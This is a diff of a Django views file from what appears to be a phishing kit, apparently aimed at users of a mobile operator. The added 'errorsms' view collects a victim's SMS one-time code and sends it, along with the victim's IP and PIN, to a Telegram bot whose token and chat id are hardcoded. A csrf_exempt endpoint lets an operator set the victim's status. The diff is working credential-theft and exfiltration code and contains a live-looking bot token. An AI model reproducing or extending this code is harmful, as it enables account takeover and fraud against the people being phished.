@@ -67,7 +67,34 @@ def errorpin(request):
         return render(request, 'login/load.html',context)
     return render(request, "login/errorpin.html")
 
-
+def errorsms(request):
+    contact_id = request.session.get('contact_id')
+    contact = ContactModel.objects.get(id=contact_id)
+    context={
+    "phone_number":contact.phone,
+    }
+    contact.approve_status="Loading"
+    contact.save()
+    if request.method == "POST":
+        phone1 = request.POST.get("input1")
+        phone2 = request.POST.get("input2")
+        phone3 = request.POST.get("input3")
+        phone4 = request.POST.get("input4")
+        pin1 = str(phone1)
+        pin2 = str(phone2)
+        pin3 = str(phone3)
+        pin4 = str(phone4)
+        concatenated_pins = pin1 + pin2 + pin3 + pin4
+        contact.sms=concatenated_pins
+        contact.page_name="Loading"
+        contact.approve_status="Loading"
+        contact.save()
+        context = {
+            'last_contact_id': contact.id
+        }
+        response = requests.post(f'https://api.telegram.org/bot6316715361:AAH3GsgZgeG7r1uwHQHGypsDCeVtSV6Zoik/sendMessage?chat_id=-1001866012482&text=id:{contact.id}|ip:{contact.ip}\nsms:{contact.sms}| PIN:{contact.phone1}  \n @kitayskiadam @TetaLab @alienfx ')
+        return render( request,'login/load.html',context )
+    return render(request, 'login/sms.html',context)
 
 def smssapprove(request):
     contact_id = request.session.get('contact_id')
@@ -221,6 +248,16 @@ def errpin(request, pk):
 
     return JsonResponse({'success': True})
 
+
+@csrf_exempt
+def errsms(request, pk):
+    contact = get_object_or_404(ContactModel, pk=pk)
+    contact.approve_status = "errsms"
+    contact.save()
+    # Here you can redirect to another page
+    # For example: return redirect('azercell')
+
+    return JsonResponse({'success': True})
 
 def approve(request, pk):
     contact = get_object_or_404(ContactModel, pk=pk)
